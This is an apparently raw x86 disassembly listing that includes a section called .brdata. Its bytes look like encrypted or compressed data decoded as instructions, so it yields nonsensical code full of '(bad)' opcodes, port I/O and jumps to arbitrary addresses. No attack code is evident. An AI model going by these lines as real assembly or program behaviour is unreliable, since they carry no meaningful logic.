  404310:	15 91 27 5d 50       	adc    $0x505d2791,%eax
  404315:	33 c3                	xor    %ebx,%eax
  404317:	4a                   	dec    %edx
  404318:	4c                   	dec    %esp
  404319:	e5 de                	in     $0xde,%eax
  40431b:	33 89 10 cb a5 a3    	xor    -0x5c5a34f0(%ecx),%ecx
  404321:	ae                   	scas   %es:(%edi),%al
  404322:	1c ea                	sbb    $0xea,%al
  404324:	67 e7 3e             	addr16 out %eax,$0x3e
  404327:	70 36                	jo     0x40435f
  404329:	09 e0                	or     %esp,%eax
  40432b:	0e                   	push   %cs
  40432c:	93                   	xchg   %eax,%ebx
  40432d:	c9                   	leave
  40432e:	5c                   	pop    %esp
  40432f:	d5 33                	aad    $0x33
  404331:	5d                   	pop    %ebp
  404332:	68 3d 2e f9 9f       	push   $0x9ff92e3d
  404337:	ea 9a 19 26 71 79 6d 	ljmp   $0x6d79,$0x7126199a
  40433e:	05 d9 af e2 f3       	add    $0xf3e2afd9,%eax
  404343:	f8                   	clc
  404344:	fa                   	cli
  404345:	d2 b9 de c2 93 9d    	sarb   %cl,-0x626c3d22(%ecx)
  40434b:	e3 c1                	jecxz  0x40430e
  40434d:	2e bd bf 71 de 3e    	cs mov $0x3ede71bf,%ebp
  404353:	2d e4 5e bf a2       	sub    $0xa2bf5ee4,%eax
  404358:	b6 c8                	mov    $0xc8,%dh
  40435a:	ac                   	lods   %ds:(%esi),%al
  40435b:	66 29 85 7c 0e 65 ae 	sub    %ax,-0x519af184(%ebp)
  404362:	64 f7 fd             	fs idiv %ebp
  404365:	6e                   	outsb  %ds:(%esi),(%dx)
  404366:	02 a5 a5 8f 72 af    	add    -0x508d705b(%ebp),%ah
  40436c:	32 4d 9c             	xor    -0x64(%ebp),%cl
  40436f:	68 12 03 bc 35       	push   $0x35bc0312
  404374:	6a 67                	push   $0x67
  404376:	c7 03 09 76 0f 75    	movl   $0x750f7609,(%ebx)
  40437c:	c9                   	leave
  40437d:	49                   	dec    %ecx
  40437e:	45                   	inc    %ebp
  40437f:	ba e2 58 36 4d       	mov    $0x4d3658e2,%edx
  404384:	57                   	push   %edi
  404385:	b5 68                	mov    $0x68,%ch
  404387:	6e                   	outsb  %ds:(%esi),(%dx)
  404388:	b1 8f                	mov    $0x8f,%cl
  40438a:	f6 61 eb             	mulb   -0x15(%ecx)
  40438d:	e6 ac                	out    %al,$0xac
  40438f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404390:	1f                   	pop    %ds
  404391:	17                   	pop    %ss
  404392:	44                   	inc    %esp
  404393:	34 ab                	xor    $0xab,%al
  404395:	0c 33                	or     $0x33,%al
  404397:	02 b1 2f d4 ce 1c    	add    0x1cced42f(%ecx),%dh
  40439d:	3c da                	cmp    $0xda,%al
  40439f:	d1 7a 5b             	sarl   $1,0x5b(%edx)
  4043a2:	11 5a 70             	adc    %ebx,0x70(%edx)
  4043a5:	52                   	push   %edx
  4043a6:	3e e1 b5             	loope,pt 0x40435e
  4043a9:	39 4f 1a             	cmp    %ecx,0x1a(%edi)
  4043ac:	49                   	dec    %ecx
  4043ad:	2b 6c 69 8a          	sub    -0x76(%ecx,%ebp,2),%ebp
  4043b1:	4f                   	dec    %edi
  4043b2:	0c dd                	or     $0xdd,%al
  4043b4:	ce                   	into
  4043b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4043b6:	79 9c                	jns    0x404354
  4043b8:	59                   	pop    %ecx
  4043b9:	28 79 6e             	sub    %bh,0x6e(%ecx)
  4043bc:	5c                   	pop    %esp
  4043bd:	4f                   	dec    %edi
  4043be:	40                   	inc    %eax
  4043bf:	53                   	push   %ebx
  4043c0:	b4 e3                	mov    $0xe3,%ah
  4043c2:	df c8                	(bad)
  4043c4:	b7 62                	mov    $0x62,%bh
  4043c6:	7f 73                	jg     0x40443b
  4043c8:	e9 eb c6 16 4e       	jmp    0x4e570ab8
  4043cd:	7a 9f                	jp     0x40436e
  4043cf:	6e                   	outsb  %ds:(%esi),(%dx)
	...

Disassembly of section .brdata:

00420000 <.brdata>:
  420000:	0a 19                	or     (%ecx),%bl
  420002:	79 04                	jns    0x420008
  420004:	aa                   	stos   %al,%es:(%edi)
  420005:	a8 d3                	test   $0xd3,%al
  420007:	dd f4                	(bad)
  420009:	89 5d b5             	mov    %ebx,-0x4b(%ebp)
  42000c:	13 f9                	adc    %ecx,%edi
  42000e:	4c                   	dec    %esp
  42000f:	64 41                	fs inc %ecx
  420011:	fe 02                	incb   (%edx)
  420013:	7a fa                	jp     0x42000f
  420015:	54                   	push   %esp
  420016:	8a 2b                	mov    (%ebx),%ch
  420018:	ac                   	lods   %ds:(%esi),%al
  420019:	2d 25 97 2b 92       	sub    $0x922b9725,%eax
  42001e:	01 b3 90 54 f1 3f    	add    %esi,0x3ff15490(%ebx)
  420024:	26 8b 20             	mov    %es:(%eax),%esp
  420027:	c0 13 1a             	rclb   $0x1a,(%ebx)
  42002a:	f3 4d                	repz dec %ebp
  42002c:	66 ef                	out    %ax,(%dx)
  42002e:	04 2e                	add    $0x2e,%al
  420030:	56                   	push   %esi
  420031:	c8 8a 23 c1          	enter  $0x238a,$0xc1
  420035:	47                   	inc    %edi
  420036:	df 83 27 7e ee e9    	filds  -0x161181d9(%ebx)
  42003c:	d6                   	salc
  42003d:	25 ad 31 7b 93       	and    $0x937b31ad,%eax
  420042:	14 c8                	adc    $0xc8,%al
  420044:	6e                   	outsb  %ds:(%esi),(%dx)
  420045:	0b d0                	or     %eax,%edx
  420047:	50                   	push   %eax
  420048:	fc                   	cld
  420049:	3f                   	aas
  42004a:	fc                   	cld
  42004b:	7e bb                	jle    0x420008
  42004d:	6b 1a 0c             	imul   $0xc,(%edx),%ebx
  420050:	63 f9                	arpl   %edi,%ecx
  420052:	62 81 e6 62 6d 80    	bound  %eax,-0x7f929d1a(%ecx)
  420058:	89 bc 45 dd bb 7c e8 	mov    %edi,-0x17834423(%ebp,%eax,2)
  42005f:	83 b0 6e a0 c6 a9 53 	xorl   $0x53,-0x56395f92(%eax)
  420066:	5b                   	pop    %ebx
  420067:	34 19                	xor    $0x19,%al
  420069:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42006a:	2f                   	das
  42006b:	19 c6                	sbb    %eax,%esi
  42006d:	f9                   	stc
  42006e:	af                   	scas   %es:(%edi),%eax
  42006f:	1a cd                	sbb    %ch,%cl
  420071:	d9 e5                	fxam
  420073:	fe                   	(bad)
  420074:	6a 43                	push   $0x43
  420076:	16                   	push   %ss
  420077:	96                   	xchg   %eax,%esi
  420078:	5c                   	pop    %esp
  420079:	84 3d ba 4f 5d c7    	test   %bh,0xc75d4fba
  42007f:	c0 c5 19             	rol    $0x19,%ch
  420082:	ad                   	lods   %ds:(%esi),%eax
  420083:	62 32                	bound  %esi,(%edx)
  420085:	82 2e f4             	subb   $0xf4,(%esi)
  420088:	30 a8 9d 84 e9 74    	xor    %ch,0x74e9849d(%eax)
  42008e:	84 b9 48 9a 69 5e    	test   %bh,0x5e699a48(%ecx)
  420094:	fb                   	sti
  420095:	72 73                	jb     0x42010a
  420097:	b7 41                	mov    $0x41,%bh
  420099:	4a                   	dec    %edx
  42009a:	65 38 57 a1          	cmp    %dl,%gs:-0x5f(%edi)
  42009e:	49                   	dec    %ecx
  42009f:	05 90 fd c4 6f       	add    $0x6fc4fd90,%eax
  4200a4:	33 c2                	xor    %edx,%eax
  4200a6:	7b c3                	jnp    0x42006b
  4200a8:	e4 50                	in     $0x50,%al
  4200aa:	b8 b3 b2 c8 1f       	mov    $0x1fc8b2b3,%eax
  4200af:	9d                   	popf
  4200b0:	0d 60 11 4e 03       	or     $0x34e1160,%eax
  4200b5:	bf 08 33 3c 13       	mov    $0x133c3308,%edi
  4200ba:	78 42                	js     0x4200fe
  4200bc:	5d                   	pop    %ebp
  4200bd:	f8                   	clc
  4200be:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4200bf:	d8 eb                	fsubr  %st(3),%st
  4200c1:	50                   	push   %eax
  4200c2:	d2 a5 12 9e 23 09    	shlb   %cl,0x9239e12(%ebp)
  4200c8:	45                   	inc    %ebp
  4200c9:	77 bd                	ja     0x420088
  4200cb:	09 34 af             	or     %esi,(%edi,%ebp,4)
  4200ce:	3a ba 3c 69 a1 98    	cmp    -0x675e96c4(%edx),%bh
  4200d4:	9f                   	lahf
  4200d5:	f8                   	clc
  4200d6:	87 ae 0c 8b 7a 52    	xchg   %ebp,0x527a8b0c(%esi)
  4200dc:	d1 a7 37 a0 18 e8    	shll   $1,-0x17e75fc9(%edi)
  4200e2:	68 79 e2 ec de       	push   $0xdeece279
  4200e7:	59                   	pop    %ecx
  4200e8:	c0 7e 4d a6          	sarb   $0xa6,0x4d(%esi)
  4200ec:	7b 8c                	jnp    0x42007a
  4200ee:	2b 44 b8 7b          	sub    0x7b(%eax,%edi,4),%eax
  4200f2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4200f3:	d6                   	salc
  4200f4:	be 89 23 5e ce       	mov    $0xce5e2389,%esi
  4200f9:	a3 15 8f 03 c6       	mov    %eax,0xc6038f15
  4200fe:	93                   	xchg   %eax,%ebx
  4200ff:	7e c0                	jle    0x4200c1
  420101:	54                   	push   %esp
  420102:	91                   	xchg   %eax,%ecx
  420103:	c0 72 2d eb          	shlb   $0xeb,0x2d(%edx)
  420107:	4e                   	dec    %esi
  420108:	9b                   	fwait
  420109:	93                   	xchg   %eax,%ebx
  42010a:	a8 e6                	test   $0xe6,%al
  42010c:	16                   	push   %ss
  42010d:	df 4f 77             	fisttps 0x77(%edi)
  420110:	4d                   	dec    %ebp
  420111:	2b d7                	sub    %edi,%edx
  420113:	e4 3a                	in     $0x3a,%al
  420115:	cd c6                	int    $0xc6
  420117:	7c 64                	jl     0x42017d
  420119:	3a 1c 51             	cmp    (%ecx,%edx,2),%bl
  42011c:	1e                   	push   %ds
  42011d:	43                   	inc    %ebx
  42011e:	97                   	xchg   %eax,%edi
  42011f:	a2 a5 da 9d 48       	mov    %al,0x489ddaa5
  420124:	02 78 c7             	add    -0x39(%eax),%bh
  420127:	e4 60                	in     $0x60,%al
  420129:	db 2d ba 15 c0 fa    	fldt   0xfac015ba
  42012f:	1e                   	push   %ds
  420130:	65 eb 47             	gs jmp 0x42017a
  420133:	2c ca                	sub    $0xca,%al
  420135:	6b 83 15 d6 33 5f 1c 	imul   $0x1c,0x5f33d615(%ebx),%eax
  42013c:	fe 4a 77             	decb   0x77(%edx)
  42013f:	9f                   	lahf
  420140:	a0 e3 19 90 c5       	mov    0xc59019e3,%al
  420145:	43                   	inc    %ebx
  420146:	9e                   	sahf
  420147:	96                   	xchg   %eax,%esi
  420148:	90                   	nop
  420149:	d5 fd                	aad    $0xfd
  42014b:	08 f3                	or     %dh,%bl
  42014d:	15 fc 1a 68 07       	adc    $0x7681afc,%eax
  420152:	95                   	xchg   %eax,%ebp
  420153:	29 d7                	sub    %edx,%edi
  420155:	9d                   	popf
  420156:	c5 1b                	lds    (%ebx),%ebx
  420158:	0c f9                	or     $0xf9,%al
  42015a:	94                   	xchg   %eax,%esp
  42015b:	b1 56                	mov    $0x56,%cl
  42015d:	38 ff                	cmp    %bh,%bh
  42015f:	be 30 fc 56 22       	mov    $0x2256fc30,%esi
  420164:	59                   	pop    %ecx
  420165:	97                   	xchg   %eax,%edi
  420166:	db 70 eb             	(bad) -0x15(%eax)
  420169:	c8 d0 5d 46          	enter  $0x5dd0,$0x46
  42016d:	36 80 97 83 1d 31 fb 	adcb   $0x15,%ss:-0x4cee27d(%edi)
  420174:	15 
  420175:	72 2c                	jb     0x4201a3
  420177:	c0 9c c0 d8 28 4d 8a 	rcrb   $0x7,-0x75b2d728(%eax,%eax,8)
  42017e:	07 
  42017f:	86 4d ef             	xchg   %cl,-0x11(%ebp)
  420182:	ad                   	lods   %ds:(%esi),%eax
  420183:	49                   	dec    %ecx
  420184:	f2 4b                	repnz dec %ebx
  420186:	41                   	inc    %ecx
  420187:	38 f4                	cmp    %dh,%ah
  420189:	77 e2                	ja     0x42016d
  42018b:	84 24 e9             	test   %ah,(%ecx,%ebp,8)
  42018e:	4f                   	dec    %edi
  42018f:	ea c8 a2 46 8b f3 2a 	ljmp   $0x2af3,$0x8b46a2c8
  420196:	88 88 2c 88 bd b2    	mov    %cl,-0x4d4277d4(%eax)
  42019c:	da 64 77 5b          	fisubl 0x5b(%edi,%esi,2)
  4201a0:	10 3a                	adc    %bh,(%edx)
  4201a2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4201a3:	ab                   	stos   %eax,%es:(%edi)
  4201a4:	c7                   	(bad)
  4201a5:	90                   	nop
  4201a6:	a8 bf                	test   $0xbf,%al
  4201a8:	34 61                	xor    $0x61,%al
  4201aa:	30 4c 30 85          	xor    %cl,-0x7b(%eax,%esi,1)
  4201ae:	9f                   	lahf
  4201af:	d9 19                	fstps  (%ecx)
  4201b1:	8e 91 8a 5a 24 7c    	mov    0x7c245a8a(%ecx),%ss
  4201b7:	f6 4e 5b 35          	testb  $0x35,0x5b(%esi)
  4201bb:	3c ae                	cmp    $0xae,%al
  4201bd:	5c                   	pop    %esp
  4201be:	7c 5d                	jl     0x42021d
  4201c0:	69 84 26 fd 92 da c0 	imul   $0x7da0bb42,-0x3f256d03(%esi,%eiz,1),%eax
  4201c7:	42 bb a0 7d 
  4201cb:	a0 3d 11 54 6a       	mov    0x6a54113d,%al
  4201d0:	e8 65 71 01 65       	call   0x6543733a
  4201d5:	ab                   	stos   %eax,%es:(%edi)
  4201d6:	b1 3f                	mov    $0x3f,%cl
  4201d8:	cc                   	int3
  4201d9:	17                   	pop    %ss
  4201da:	fa                   	cli
  4201db:	b1 01                	mov    $0x1,%cl
  4201dd:	e3 b7                	jecxz  0x420196
  4201df:	dc 8f 5c 57 a1 22    	fmull  0x22a1575c(%edi)
  4201e5:	a2 24 3b 2f 68       	mov    %al,0x682f3b24
  4201ea:	8d 67 b9             	lea    -0x47(%edi),%esp
  4201ed:	c1 01 54             	roll   $0x54,(%ecx)
  4201f0:	78 2d                	js     0x42021f
  4201f2:	4e                   	dec    %esi
  4201f3:	ac                   	lods   %ds:(%esi),%al
  4201f4:	21 12                	and    %edx,(%edx)
  4201f6:	e3 f2                	jecxz  0x4201ea
  4201f8:	e3 4a                	jecxz  0x420244
  4201fa:	03 df                	add    %edi,%ebx
  4201fc:	4e                   	dec    %esi
  4201fd:	b8 0a 21 94 87       	mov    $0x8794210a,%eax
  420202:	39 7d a2             	cmp    %edi,-0x5e(%ebp)
  420205:	96                   	xchg   %eax,%esi
  420206:	fe                   	(bad)
  420207:	79 f0                	jns    0x4201f9
  420209:	02 5d c7             	add    -0x39(%ebp),%bl
  42020c:	ef                   	out    %eax,(%dx)
  42020d:	1b 4f 08             	sbb    0x8(%edi),%ecx
  420210:	41                   	inc    %ecx
  420211:	71 4a                	jno    0x42025d
  420213:	f5                   	cmc
  420214:	fa                   	cli
  420215:	cd be                	int    $0xbe
  420217:	3f                   	aas
  420218:	6f                   	outsl  %ds:(%esi),(%dx)
  420219:	b2 65                	mov    $0x65,%dl
  42021b:	93                   	xchg   %eax,%ebx
  42021c:	ce                   	into
  42021d:	80 a2 67 84 18 09 ad 	andb   $0xad,0x9188467(%edx)
  420224:	c5 31                	lds    (%ecx),%esi
  420226:	fb                   	sti
  420227:	1d 9c 16 ed f6       	sbb    $0xf6ed169c,%eax
  42022c:	66 6a 5a             	pushw  $0x5a
  42022f:	6d                   	insl   (%dx),%es:(%edi)
  420230:	4c                   	dec    %esp
  420231:	fc                   	cld
  420232:	d1 25 f7 95 d3 c1    	shll   $1,0xc1d395f7
  420238:	3c 39                	cmp    $0x39,%al
  42023a:	4a                   	dec    %edx
  42023b:	cf                   	iret
  42023c:	8c 53 e7             	mov    %ss,-0x19(%ebx)
  42023f:	33 78 41             	xor    0x41(%eax),%edi
  420242:	21 0c 02             	and    %ecx,(%edx,%eax,1)
  420245:	b9 8b 1a e4 57       	mov    $0x57e41a8b,%ecx
  42024a:	bd ca 05 69 e4       	mov    $0xe46905ca,%ebp
  42024f:	60                   	pusha
  420250:	da 43 cf             	fiaddl -0x31(%ebx)
  420253:	05 27 0e 05 1b       	add    $0x1b050e27,%eax
  420258:	33 a0 5b 36 fe 0e    	xor    0xefe365b(%eax),%esp
  42025e:	df 1d 4f 18 d6 5d    	fistps 0x5dd6184f
  420264:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  420265:	9a 98 6a 90 19 32 79 	lcall  $0x7932,$0x19906a98
  42026c:	f3 92                	repz xchg %eax,%edx
  42026e:	3c a1                	cmp    $0xa1,%al
  420270:	cd 76                	int    $0x76
  420272:	e2 77                	loop   0x4202eb
  420274:	6a 17                	push   $0x17
  420276:	23 74 a3 cd          	and    -0x33(%ebx,%eiz,4),%esi
  42027a:	58                   	pop    %eax
  42027b:	6c                   	insb   (%dx),%es:(%edi)
  42027c:	21 c5                	and    %eax,%ebp
  42027e:	87 c2                	xchg   %eax,%edx
  420280:	c9                   	leave
  420281:	8f                   	(bad)
  420282:	30 f3                	xor    %dh,%bl
  420284:	36 05 36 34 36 21    	ss add $0x21363436,%eax
  42028a:	9d                   	popf
  42028b:	c4 4e 32             	les    0x32(%esi),%ecx
  42028e:	eb 41                	jmp    0x4202d1
  420290:	81 35 81 ff 71 9f 57 	xorl   $0x458ad457,0x9f71ff81
  420297:	d4 8a 45 
  42029a:	5b                   	pop    %ebx
  42029b:	fc                   	cld
  42029c:	84 92 d2 06 d0 76    	test   %dl,0x76d006d2(%edx)
  4202a2:	49                   	dec    %ecx
  4202a3:	60                   	pusha
  4202a4:	b4 73                	mov    $0x73,%ah
  4202a6:	ba 02 e4 6d 2d       	mov    $0x2d6de402,%edx
  4202ab:	15 a9 84 62 ee       	adc    $0xee6284a9,%eax
  4202b0:	98                   	cwtl
  4202b1:	da 9a bb ae a3 ba    	ficompl -0x455c5145(%edx)
  4202b7:	36 7c 8c             	ss jl  0x420246
  4202ba:	f5                   	cmc
  4202bb:	4a                   	dec    %edx
  4202bc:	ae                   	scas   %es:(%edi),%al
  4202bd:	97                   	xchg   %eax,%edi
  4202be:	49                   	dec    %ecx
  4202bf:	da af 15 95 0e 42    	fisubrl 0x420e9515(%edi)
  4202c5:	9c                   	pushf
  4202c6:	9d                   	popf
  4202c7:	7b 47                	jnp    0x420310
  4202c9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4202ca:	99                   	cltd
  4202cb:	d0 bd 93 8f b6 74    	sarb   $1,0x74b68f93(%ebp)
  4202d1:	86 ad bd da f0 a8    	xchg   %ch,-0x570f2543(%ebp)
  4202d7:	64 70 70             	fs jo  0x42034a
  4202da:	89 cb                	mov    %ecx,%ebx
  4202dc:	8a 08                	mov    (%eax),%cl
  4202de:	67 48                	addr16 dec %eax
  4202e0:	03 a3 1c f7 61 1a    	add    0x1a61f71c(%ebx),%esp
  4202e6:	5f                   	pop    %edi
  4202e7:	20 de                	and    %bl,%dh
  4202e9:	ee                   	out    %al,(%dx)
  4202ea:	ce                   	into
  4202eb:	67 c2 d0 04          	addr16 ret $0x4d0
  4202ef:	3f                   	aas
  4202f0:	a0 1c d3 6d e8       	mov    0xe86dd31c,%al
  4202f5:	5a                   	pop    %edx
  4202f6:	56                   	push   %esi
  4202f7:	2d 77 2e 9e 7a       	sub    $0x7a9e2e77,%eax
  4202fc:	aa                   	stos   %al,%es:(%edi)
  4202fd:	f7 73 c5             	divl   -0x3b(%ebx)
  420300:	8c 9f 42 bb 72 a6    	mov    %ds,-0x598d44be(%edi)
  420306:	eb a1                	jmp    0x4202a9
  420308:	b6 88                	mov    $0x88,%dh
  42030a:	3e 31 55 9e          	xor    %edx,%ds:-0x62(%ebp)
  42030e:	fc                   	cld
  42030f:	8d 2e                	lea    (%esi),%ebp
  420311:	ba c9 96 40 16       	mov    $0x164096c9,%edx
  420316:	80 24 97 e7          	andb   $0xe7,(%edi,%edx,4)
  42031a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42031b:	cf                   	iret
  42031c:	1e                   	push   %ds
  42031d:	37                   	aaa
  42031e:	56                   	push   %esi
  42031f:	5f                   	pop    %edi
  420320:	f3 96                	repz xchg %eax,%esi
  420322:	cd a5                	int    $0xa5
  420324:	0e                   	push   %cs
  420325:	6d                   	insl   (%dx),%es:(%edi)
  420326:	bc d1 f4 45 29       	mov    $0x2945f4d1,%esp
  42032b:	17                   	pop    %ss
  42032c:	ea f4 5d 3f 18 9c 36 	ljmp   $0x369c,$0x183f5df4
  420333:	6a cc                	push   $0xffffffcc
  420335:	d1 43 3d             	roll   $1,0x3d(%ebx)
  420338:	78 ae                	js     0x4202e8
  42033a:	f7 9f ae 4b 27 70    	negl   0x70274bae(%edi)
  420340:	a0 d7 5c 59 6d       	mov    0x6d595cd7,%al
  420345:	00 7c 31 c4          	add    %bh,-0x3c(%ecx,%esi,1)
  420349:	0e                   	push   %cs
  42034a:	72 7a                	jb     0x4203c6
  42034c:	ce                   	into
  42034d:	e7 ef                	out    %eax,$0xef
  42034f:	d3 97 f5 8e bf 1a    	rcll   %cl,0x1abf8ef5(%edi)
  420355:	99                   	cltd
  420356:	5c                   	pop    %esp
  420357:	05 88 72 c5 5e       	add    $0x5ec57288,%eax
  42035c:	c1 7e c4 24          	sarl   $0x24,-0x3c(%esi)
  420360:	70 24                	jo     0x420386
  420362:	26 90                	es nop
  420364:	96                   	xchg   %eax,%esi
  420365:	fd                   	std
  420366:	9b                   	fwait
  420367:	e9 ac d6 8d c2       	jmp    0xc2cfda18
  42036c:	06                   	push   %es
  42036d:	66 bc 0b 07          	mov    $0x70b,%sp
  420371:	95                   	xchg   %eax,%ebp
  420372:	71 74                	jno    0x4203e8
  420374:	da 62 63             	fisubl 0x63(%edx)
  420377:	0d 9e 7b 55 26       	or     $0x26557b9e,%eax
  42037c:	ca 12 47             	lret   $0x4712
  42037f:	ff c0                	inc    %eax
  420381:	eb 39                	jmp    0x4203bc
  420383:	50                   	push   %eax
  420384:	b3 73                	mov    $0x73,%bl
  420386:	2b 22                	sub    (%edx),%esp
  420388:	91                   	xchg   %eax,%ecx
  420389:	f2 bf c9 ac 2a 58    	repnz mov $0x582aacc9,%edi
  42038f:	2a c6                	sub    %dh,%al
  420391:	01 55 60             	add    %edx,0x60(%ebp)
  420394:	09 51 80             	or     %edx,-0x80(%ecx)
  420397:	60                   	pusha
  420398:	09 6c d6 df          	or     %ebp,-0x21(%esi,%edx,8)
  42039c:	02 ad ba af 3d d4    	add    -0x2bc25046(%ebp),%ch
  4203a2:	bb ac 70 a2 df       	mov    $0xdfa270ac,%ebx
  4203a7:	14 58                	adc    $0x58,%al
  4203a9:	65 c1 51 4a 3e       	rcll   $0x3e,%gs:0x4a(%ecx)
  4203ae:	9f                   	lahf
  4203af:	2a 18                	sub    (%eax),%bl
  4203b1:	17                   	pop    %ss
  4203b2:	91                   	xchg   %eax,%ecx
  4203b3:	03 0a                	add    (%edx),%ecx
  4203b5:	f0 83 dc fc          	lock sbb $0xfffffffc,%esp
  4203b9:	c8 75 b5 ee          	enter  $0xb575,$0xee
  4203bd:	a1 67 8e e0 7a       	mov    0x7ae08e67,%eax
  4203c2:	59                   	pop    %ecx
  4203c3:	67 d2 53 4b          	rclb   %cl,0x4b(%bp,%di)
  4203c7:	40                   	inc    %eax
  4203c8:	c4 2c 3d 19 b6 05 2f 	les    0x2f05b619(,%edi,1),%ebp
  4203cf:	f2 a8 de             	repnz test $0xde,%al
  4203d2:	21 cb                	and    %ecx,%ebx
  4203d4:	9a b7 13 a4 8c 90 05 	lcall  $0x590,$0x8ca413b7
  4203db:	7d 7e                	jge    0x42045b
  4203dd:	69 f7 55 70 42 e9    	imul   $0xe9427055,%edi,%esi
  4203e3:	2e 62 1b             	bound  %ebx,%cs:(%ebx)
  4203e6:	db 07                	fildl  (%edi)
  4203e8:	54                   	push   %esp
  4203e9:	f4                   	hlt
  4203ea:	cd e0                	int    $0xe0
  4203ec:	46                   	inc    %esi
  4203ed:	cd bf                	int    $0xbf
  4203ef:	b9 38 a6 b1 92       	mov    $0x92b1a638,%ecx
  4203f4:	2a 7f a3             	sub    -0x5d(%edi),%bh
  4203f7:	6b 1c 58 95          	imul   $0xffffff95,(%eax,%ebx,2),%ebx
  4203fb:	44                   	inc    %esp
  4203fc:	0e                   	push   %cs
  4203fd:	31 87 1d 00 0a 79    	xor    %eax,0x790a001d(%edi)
  420403:	f6 f2                	div    %dl
  420405:	e2 6b                	loop   0x420472
  420407:	cf                   	iret
  420408:	e4 bb                	in     $0xbb,%al
  42040a:	5d                   	pop    %ebp
  42040b:	a8 d6                	test   $0xd6,%al
  42040d:	94                   	xchg   %eax,%esp
  42040e:	5f                   	pop    %edi
  42040f:	c6                   	(bad)
  420410:	ad                   	lods   %ds:(%esi),%eax
  420411:	19 11                	sbb    %edx,(%ecx)
  420413:	28 d5                	sub    %dl,%ch
  420415:	25 72 57 c8 6d       	and    $0x6dc85772,%eax
  42041a:	40                   	inc    %eax
  42041b:	7f ed                	jg     0x42040a
  42041d:	f8                   	clc
  42041e:	be 03 77 a6 45       	mov    $0x45a67703,%esi
  420423:	d1 e3                	shl    $1,%ebx
  420425:	ce                   	into
  420426:	b7 ff                	mov    $0xff,%bh
  420428:	16                   	push   %ss
  420429:	f1                   	int1
  42042a:	8c 1d 1f 1d df 87    	mov    %ds,0x87df1d1f
  420430:	5d                   	pop    %ebp
  420431:	dd a6 62 38 6b a2    	frstor -0x5d94c79e(%esi)
  420437:	8e 59 a1             	mov    -0x5f(%ecx),%ds
  42043a:	dc bf 4b 81 a7 4e    	fdivrl 0x4ea7814b(%edi)
  420440:	77 71                	ja     0x4204b3
  420442:	ee                   	out    %al,(%dx)
  420443:	c6                   	(bad)
  420444:	7e 1d                	jle    0x420463
  420446:	f8                   	clc
  420447:	3b 4c 2a 13          	cmp    0x13(%edx,%ebp,1),%ecx
  42044b:	53                   	push   %ebx
  42044c:	9a 46 6f 78 79 1b 16 	lcall  $0x161b,$0x79786f46
  420453:	be a8 bc 27 a7       	mov    $0xa727bca8,%esi
  420458:	8a c7                	mov    %bh,%al
  42045a:	29 fe                	sub    %edi,%esi
  42045c:	be c9 f5 9c c7       	mov    $0xc79cf5c9,%esi
  420461:	27                   	daa
  420462:	4c                   	dec    %esp
  420463:	39 f1                	cmp    %esi,%ecx
  420465:	40                   	inc    %eax
  420466:	68 52 f1 7f 49       	push   $0x497ff152
  42046b:	96                   	xchg   %eax,%esi
  42046c:	f4                   	hlt
  42046d:	8e 9c a3 17 b6 88 f1 	mov    -0xe7749e9(%ebx,%eiz,4),%ds
  420474:	6a 70                	push   $0x70
  420476:	0e                   	push   %cs
  420477:	6e                   	outsb  %ds:(%esi),(%dx)
  420478:	2b 25 b0 16 0b 3d    	sub    0x3d0b16b0,%esp
  42047e:	b5 54                	mov    $0x54,%ch
  420480:	32 65 d6             	xor    -0x2a(%ebp),%ah
  420483:	70 57                	jo     0x4204dc
  420485:	01 02                	add    %eax,(%edx)
  420487:	46                   	inc    %esi
  420488:	cc                   	int3
  420489:	ad                   	lods   %ds:(%esi),%eax
  42048a:	db b4 73 d6 c3 f6 6a 	(bad) 0x6af6c3d6(%ebx,%esi,2)
  420491:	fe                   	(bad)
  420492:	e0 0a                	loopne 0x42049e
  420494:	83 64 a9 8e 0b       	andl   $0xb,-0x72(%ecx,%ebp,4)
  420499:	4a                   	dec    %edx
  42049a:	9a 66 84 55 38 73 a9 	lcall  $0xa973,$0x38558466
  4204a1:	ef                   	out    %eax,(%dx)
  4204a2:	f9                   	stc
  4204a3:	c7 c2 d8 77 ef fb    	mov    $0xfbef77d8,%edx
  4204a9:	d1 48 e0             	rorl   $1,-0x20(%eax)
  4204ac:	e0 13                	loopne 0x4204c1
  4204ae:	73 02                	jae    0x4204b2
  4204b0:	d9 53 2c             	fsts   0x2c(%ebx)
  4204b3:	55                   	push   %ebp
  4204b4:	1f                   	pop    %ds
  4204b5:	59                   	pop    %ecx
  4204b6:	4f                   	dec    %edi
  4204b7:	43                   	inc    %ebx
  4204b8:	3f                   	aas
  4204b9:	69 9a 82 0b de 6e d3 	imul   $0x26c2f5d3,0x6ede0b82(%edx),%ebx
  4204c0:	f5 c2 26 
  4204c3:	e8 27 90 97 0b       	call   0xbd994ef
  4204c8:	29 00                	sub    %eax,(%eax)
  4204ca:	d0 32                	shlb   $1,(%edx)
  4204cc:	44                   	inc    %esp
  4204cd:	71 9d                	jno    0x42046c
  4204cf:	00 4c 77 fe          	add    %cl,-0x2(%edi,%esi,2)
  4204d3:	07                   	pop    %es
  4204d4:	4d                   	dec    %ebp
  4204d5:	9d                   	popf
  4204d6:	fd                   	std
  4204d7:	d3 3e                	sarl   %cl,(%esi)
  4204d9:	e3 cd                	jecxz  0x4204a8
  4204db:	f5                   	cmc
  4204dc:	b2 f5                	mov    $0xf5,%dl
  4204de:	59                   	pop    %ecx
  4204df:	d9 85 15 1c 4b 94    	flds   -0x6bb4e3eb(%ebp)
  4204e5:	64 75 74             	fs jne 0x42055c
  4204e8:	e0 10                	loopne 0x4204fa
  4204ea:	3e 69 b3 6b 02 db 86 	imul   $0xe49d74a9,%ds:-0x7924fd95(%ebx),%esi
  4204f1:	a9 74 9d e4 
  4204f5:	fe                   	(bad)
  4204f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4204f7:	9b                   	fwait
  4204f8:	ae                   	scas   %es:(%edi),%al
  4204f9:	94                   	xchg   %eax,%esp
  4204fa:	59                   	pop    %ecx
  4204fb:	db bd 5f 07 5a 8e    	fstpt  -0x71a5f8a1(%ebp)
  420501:	54                   	push   %esp
  420502:	eb 24                	jmp    0x420528
  420504:	2e 56                	cs push %esi
